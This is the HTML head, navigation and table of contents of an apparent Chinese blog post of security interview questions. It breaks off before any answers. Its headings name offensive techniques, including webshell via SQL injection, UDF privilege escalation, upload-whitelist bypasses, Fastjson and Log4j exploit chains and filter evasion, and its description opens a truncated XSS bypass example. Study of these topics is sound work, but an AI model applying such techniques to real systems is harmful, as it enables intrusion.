<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="以下是对这些问题的回答，尽量做到全面且准确。但请注意，安全领域的知识不断更新，实际面试中还需要根据具体情况进行灵活应对。  XSS（跨站脚本攻击）XSS对引号实体的绕过（a标签）攻击者可以通过一些技巧绕过对引号的过滤。例如，如果过滤了双引号&quot;，可以使用单引号&#39;或HTML实体&amp;#x27;来替代。对于a标签，攻击者可以构造类似以下的恶意代码： 1&lt;a href&#x3D;&amp;#x2">
<meta property="og:type" content="article">
<meta property="og:title" content="【工作】面试题整理 网络收集问题">
<meta property="og:url" content="https://godreams.cn/2024/03/16/work/workpre3/index.html">
<meta property="og:site_name" content="g0dam">
<meta property="og:description" content="以下是对这些问题的回答，尽量做到全面且准确。但请注意，安全领域的知识不断更新，实际面试中还需要根据具体情况进行灵活应对。  XSS（跨站脚本攻击）XSS对引号实体的绕过（a标签）攻击者可以通过一些技巧绕过对引号的过滤。例如，如果过滤了双引号&quot;，可以使用单引号&#39;或HTML实体&amp;#x27;来替代。对于a标签，攻击者可以构造类似以下的恶意代码： 1&lt;a href&#x3D;&amp;#x2">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://godreams.cn/2024/03/16/work/workpre3/image.png">
<meta property="article:published_time" content="2024-03-16T13:09:24.000Z">
<meta property="article:modified_time" content="2025-03-17T08:42:52.026Z">
<meta property="article:author" content="g0dam">
<meta property="article:tag" content="null">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://godreams.cn/2024/03/16/work/workpre3/image.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>【工作】面试题整理 网络收集问题</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="g0dam" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/03/17/work/workandroid/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/03/03/work/workpre1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/03/16/work/workpre3/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/03/16/work/workpre3/&text=【工作】面试题整理 网络收集问题"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/03/16/work/workpre3/&title=【工作】面试题整理 网络收集问题"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/03/16/work/workpre3/&is_video=false&description=【工作】面试题整理 网络收集问题"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【工作】面试题整理 网络收集问题&body=Check out this article: https://godreams.cn/2024/03/16/work/workpre3/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/03/16/work/workpre3/&title=【工作】面试题整理 网络收集问题"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/03/16/work/workpre3/&title=【工作】面试题整理 网络收集问题"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/03/16/work/workpre3/&title=【工作】面试题整理 网络收集问题"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/03/16/work/workpre3/&title=【工作】面试题整理 网络收集问题"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/03/16/work/workpre3/&name=【工作】面试题整理 网络收集问题&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/03/16/work/workpre3/&t=【工作】面试题整理 网络收集问题"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%EF%BC%88%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">XSS（跨站脚本攻击）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E5%AF%B9%E5%BC%95%E5%8F%B7%E5%AE%9E%E4%BD%93%E7%9A%84%E7%BB%95%E8%BF%87%EF%BC%88a%E6%A0%87%E7%AD%BE%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">XSS对引号实体的绕过（a标签）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%8C%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8%E8%A7%A3%E5%86%B3XSS%E6%BC%8F%E6%B4%9E%E9%97%AE%E9%A2%98"><span class="toc-number">1.2.</span> <span class="toc-text">富文本编辑器解决XSS漏洞问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%8C%E6%96%87%E6%9C%AC%E6%B8%B2%E6%9F%93%E7%9A%84%E9%A2%84%E9%98%B2"><span class="toc-number">1.3.</span> <span class="toc-text">富文本渲染的预防</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">2. SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%BFWebShell%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">拿WebShell的方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%83%BD%E5%86%99%E5%85%A5%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">能写入的函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UDF%E6%8F%90%E6%9D%83%E7%9A%84%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86"><span class="toc-number">2.3.</span> <span class="toc-text">UDF提权的底层原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-number">2.4.</span> <span class="toc-text">预编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E8%83%BD%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">2.5.</span> <span class="toc-text">不能预编译的情况</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ORDER-BY%E4%B8%8D%E8%83%BD%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-number">2.6.</span> <span class="toc-text">ORDER BY不能预编译的原因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ORDER-BY%E8%AF%AD%E6%B3%95%E6%A0%91%E6%8A%A5%E9%94%99%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-number">2.7.</span> <span class="toc-text">ORDER BY语法树报错的原因</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.</span> <span class="toc-text">3. 文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%99%A4%E4%BA%86%E6%8B%BFWebShell%E8%BF%98%E8%83%BD%E5%81%9A%E4%BB%80%E4%B9%88"><span class="toc-number">3.1.</span> <span class="toc-text">除了拿WebShell还能做什么</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%A0HTML%E5%90%8E%E8%BF%98%E8%83%BD%E5%81%9A%E4%BB%80%E4%B9%88"><span class="toc-number">3.2.</span> <span class="toc-text">传HTML后还能做什么</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache-PHP-JPG%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.</span> <span class="toc-text">Apache PHP JPG白名单绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IIS%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">3.4.</span> <span class="toc-text">IIS白名单绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-CSRF%EF%BC%88%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">4. CSRF（跨站请求伪造）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Token%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="toc-number">4.1.</span> <span class="toc-text">Token的实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EJWT"><span class="toc-number">4.2.</span> <span class="toc-text">关于JWT</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">5.</span> <span class="toc-text">5. 命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-number">5.1.</span> <span class="toc-text">命令执行的原因</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E5%86%85%E7%BD%91%E6%94%BB%E5%87%BB"><span class="toc-number">6.</span> <span class="toc-text">8. 内网攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%9F%9F%E6%8E%A7%E6%94%BB%E5%87%BB"><span class="toc-number">6.1.</span> <span class="toc-text">内网域控攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E4%B8%9A%E5%8A%A1%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.</span> <span class="toc-text">9. 业务漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%99%BB%E5%BD%95%E6%A1%86%E8%AE%BE%E8%AE%A1"><span class="toc-number">7.1.</span> <span class="toc-text">安全登录框设计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%A1%E9%AA%8C%E5%90%88%E6%B3%95%E7%99%BB%E5%BD%95%E7%9A%84%E6%A8%A1%E5%BC%8F"><span class="toc-number">7.2.</span> <span class="toc-text">校验合法登录的模式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E6%B5%81%E7%A8%8B"><span class="toc-number">7.3.</span> <span class="toc-text">登录流程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%AE%89%E5%85%A8%E4%BF%A1%E6%81%AF%E5%92%8C%E4%BA%8B%E4%BB%B6%E7%AE%A1%E7%90%86-SIEM-%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-number">8.</span> <span class="toc-text">对安全信息和事件管理(SIEM)系统的理解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-CSRF%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E8%8C%83"><span class="toc-number">9.</span> <span class="toc-text">8. CSRF攻击及防范</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRLF-%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E6%9C%80%E5%A4%A7%E5%8C%96"><span class="toc-number">10.</span> <span class="toc-text">CRLF 漏洞如何利用最大化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%BB%E8%A6%81%E6%B6%89%E5%8F%8A%E4%BB%A5%E4%B8%8B%E5%87%A0%E4%B8%AA%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-number">11.</span> <span class="toc-text">Fastjson的反序列化漏洞利用链主要涉及以下几个步骤：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j%E6%BC%8F%E6%B4%9E"><span class="toc-number">12.</span> <span class="toc-text">Log4j漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TLS%E9%99%8D%E7%BA%A7%E6%BC%8F%E6%B4%9E"><span class="toc-number">13.</span> <span class="toc-text">TLS降级漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">14.</span> <span class="toc-text">HTTP请求走私漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OSPF%E7%AE%97%E6%B3%95%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">15.</span> <span class="toc-text">OSPF算法的基本原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%8A%E6%89%AB%E6%8F%8F"><span class="toc-number">16.</span> <span class="toc-text">半扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro%E6%BC%8F%E6%B4%9E%E7%89%B9%E5%BE%81"><span class="toc-number">17.</span> <span class="toc-text">Shiro漏洞特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AES%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86"><span class="toc-number">18.</span> <span class="toc-text">AES加密原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">19.</span> <span class="toc-text">进程和线程的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E5%8E%9F%E7%90%86"><span class="toc-number">20.</span> <span class="toc-text">（2）冒泡排序原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">21.</span> <span class="toc-text">（1）进程和线程的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E5%8E%9F%E7%90%86-1"><span class="toc-number">22.</span> <span class="toc-text">（2）冒泡排序原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%886%EF%BC%89%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E3%80%81%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E4%BB%A5%E5%8F%8Ahash%E7%AE%97%E6%B3%95%E4%B8%BE%E4%BE%8B%E5%8F%8A%E7%AE%97%E6%B3%95%E6%B5%81%E7%A8%8B%E7%BB%86%E8%8A%82"><span class="toc-number">23.</span> <span class="toc-text">（6）对称加密、非对称加密以及hash算法举例及算法流程细节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%887%EF%BC%89SHA-1%E5%92%8CSHA-2%E5%8C%BA%E5%88%AB"><span class="toc-number">24.</span> <span class="toc-text">（7）SHA-1和SHA-2区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3%E4%B8%8BECC"><span class="toc-number">25.</span> <span class="toc-text">详细讲解下ECC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%86%E5%90%91%E7%9B%B8%E5%85%B3"><span class="toc-number">26.</span> <span class="toc-text">逆向相关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%AC%E8%99%AB%E7%9B%B8%E5%85%B3"><span class="toc-number">27.</span> <span class="toc-text">爬虫相关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%92%8C%E9%9D%9E%E7%BC%96%E8%AF%91%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">28.</span> <span class="toc-text">编译和非编译的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-CodeQL%E6%98%AF%E5%90%A6%E5%8F%AF%E4%BB%A5%E8%A2%AB%E4%BF%AE%E6%94%B9%E4%B8%BA%E6%97%A0%E9%9C%80%E7%BC%96%E8%AF%91%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-number">29.</span> <span class="toc-text">4. CodeQL是否可以被修改为无需编译的工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%BA%86%E8%A7%A3%E5%93%AA%E4%BA%9B%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%A6%82%E4%BD%95%E7%94%A8CodeQL%E6%A3%80%E6%B5%8B"><span class="toc-number">30.</span> <span class="toc-text">5. 了解哪些类型的漏洞，如何用CodeQL检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%AD%E8%A1%8C%E7%9A%84%E7%94%B5%E5%AD%90%E5%8F%A3%E4%BB%A4%E5%8D%A1%EF%BC%8C%E4%B8%8A%E9%9D%A2%E6%98%BE%E7%A4%BA%E7%9A%84%E5%AD%97%E7%AC%A6%E6%AF%8F%E4%B8%80%E5%88%86%E9%92%9F%E5%8F%98%E6%8D%A2%E4%B8%80%E6%AC%A1%E3%80%82%E9%97%AE%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95%E3%80%82"><span class="toc-number">31.</span> <span class="toc-text">1. 中行的电子口令卡，上面显示的字符每一分钟变换一次。问实现方法。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AF%B9%E5%BE%85%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%E6%80%8E%E4%B9%88%E5%8E%BB%E6%80%9D%E8%80%83%EF%BC%9F"><span class="toc-number">32.</span> <span class="toc-text">3. 对待一个问题怎么去思考？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-PKI%E7%9A%84%E6%9E%B6%E6%9E%84"><span class="toc-number">33.</span> <span class="toc-text">5. PKI的架构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-DMZ%E7%9A%84%E4%BD%9C%E7%94%A8%E4%BB%A5%E5%8F%8A%E4%BD%8D%E7%BD%AE"><span class="toc-number">34.</span> <span class="toc-text">10. DMZ的作用以及位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E6%96%B0%E7%88%86%E5%87%BA%E7%9A%84Tomcat-AJP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">35.</span> <span class="toc-text">最新爆出的Tomcat AJP协议漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B%E4%B8%AD%E5%A6%82%E6%9E%9C%E8%A2%ABban-IP%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number">36.</span> <span class="toc-text">渗透测试过程中如果被ban IP怎么办？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%8D%95%E5%BC%95%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="toc-number">37.</span> <span class="toc-text">SQL注入单引号被过滤了怎么绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#passwd%E4%B8%8Eshadow%E6%96%87%E4%BB%B6%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">38.</span> <span class="toc-text">passwd与shadow文件的关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%80%8E%E6%A0%B7%E4%BB%8E%E6%96%87%E4%BB%B6%E9%80%89%E5%8F%96%E5%8C%85%E5%90%AB%E7%89%B9%E5%AE%9A%E5%AD%97%E7%AC%A6%E7%9A%84%E8%A1%8C%EF%BC%8C%E5%B9%B6%E6%9B%BF%E6%8D%A2%E7%9B%B8%E5%85%B3%E5%AD%97%E7%AC%A6"><span class="toc-number">39.</span> <span class="toc-text">Linux怎样从文件选取包含特定字符的行，并替换相关字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VRRP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0"><span class="toc-number">40.</span> <span class="toc-text">VRRP协议的原理及实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E9%82%A3%E4%BA%9B%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD%E6%98%AF%E7%BB%9D%E5%AF%B9%E5%AE%89%E5%85%A8%E7%9A%84%E4%B9%88%EF%BC%9F"><span class="toc-number">41.</span> <span class="toc-text">SQL注入的那些防御措施是绝对安全的么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%EF%BC%8CNmap%E6%89%AB%E6%8F%8F%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82%EF%BC%8C%E9%92%88%E5%AF%B9%E4%BB%80%E4%B9%88%E6%83%85%E5%86%B5%E4%BD%BF%E7%94%A8%E5%93%AA%E7%A7%8D%E6%89%AB%E6%8F%8F"><span class="toc-number">42.</span> <span class="toc-text">Nmap扫描原理，Nmap扫描中的一些细节，针对什么情况使用哪种扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AF%B9%E5%A4%96%E4%BD%BF%E7%94%A8nmap%E6%89%AB%E6%8F%8F%EF%BC%8C%E9%81%87%E5%88%B0-%E7%9A%84%E6%83%85%E5%86%B5%E5%8F%88%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">43.</span> <span class="toc-text">如何对外使用nmap扫描，遇到***的情况又该怎么办</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%B1%82%E7%9A%84%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%EF%BC%8CIP%E6%AC%BA%E9%AA%97%EF%BC%8C%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8B%A6%E6%88%AA"><span class="toc-number">44.</span> <span class="toc-text">网络层的常见攻击方式，IP欺骗，第三方拦截</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASP%E4%B8%8EPHP%E7%BD%91%E7%AB%99%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">45.</span> <span class="toc-text">ASP与PHP网站的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E5%8F%ABDMA"><span class="toc-number">46.</span> <span class="toc-text">什么叫DMA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E7%9A%84%E5%9B%9B%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">47.</span> <span class="toc-text">获取网站绝对路径的四种方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2SQL%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%85%B7%E4%BD%93%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">48.</span> <span class="toc-text">如何防止SQL注入，具体的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLmap%E4%B8%AD-T%E7%9F%A5%E9%81%93%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D%E5%90%97%EF%BC%9F"><span class="toc-number">49.</span> <span class="toc-text">SQLmap中-T知道什么意思吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E5%88%97%E8%A1%A8%E6%8E%A8%E5%AF%BC"><span class="toc-number">50.</span> <span class="toc-text">Python列表推导</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%9F%90%E4%B8%AA%E7%B1%BB%E6%98%AF%E5%90%A6%E6%9C%89%E6%9F%90%E7%A7%8D%E5%B1%9E%E6%80%A7"><span class="toc-number">51.</span> <span class="toc-text">判断某个类是否有某种属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#init-%E5%92%8C-new"><span class="toc-number">52.</span> <span class="toc-text">init 和 new</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A3%85%E9%A5%B0%E5%99%A8%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">53.</span> <span class="toc-text">装饰器应用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95-staticmethod"><span class="toc-number">54.</span> <span class="toc-text">静态方法 staticmethod</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%B2%E7%9F%A5%E6%9F%90%E7%AB%AF%E5%8F%A3%EF%BC%8C%E6%9F%A5%E7%9C%8B%E5%8D%A0%E7%94%A8%E5%AE%83%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%8F%B7"><span class="toc-number">55.</span> <span class="toc-text">已知某端口，查看占用它的进程号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 